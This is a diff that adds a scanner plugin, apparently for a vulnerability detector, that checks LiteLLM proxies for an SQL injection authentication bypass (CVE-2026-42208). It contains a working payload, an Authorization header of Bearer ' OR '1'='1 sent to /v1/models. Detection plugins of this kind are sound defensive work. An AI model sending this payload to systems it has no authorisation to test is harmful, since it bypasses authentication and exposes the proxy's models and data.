@@ -1,0 +1,76 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Litellm_SQL_Injection_CVE_2026_42208"
+  author: "mangeshw"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-42208"
+  }
+  severity: CRITICAL
+  title: "SQL Injection affecting LiteLLM proxy authentication (CVE-2026-42208)"
+  description: "Vulnerable LiteLLM versions are susceptible to SQL injection in token verification queries. An unauthenticated attacker can supply crafted API keys containing malicious SQL syntax to bypass authentication."
+  recommendation: "Update the version to v1.83.7 or later where SQL queries are properly parameterized."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-42208"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_litellm"
+  http_request: {
+    method: GET
+    uri: "/health/readiness"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "trigger_sql_injection"
+  http_request: {
+    method: GET
+    uri: "/v1/models"
+    headers: [
+      { name: "Authorization" value: "Bearer ' OR '1'='1" }
+    ]
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "object" }
+        ]
+      }
+    }
+  }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_litellm",
+    "trigger_sql_injection"
+  ]
+}
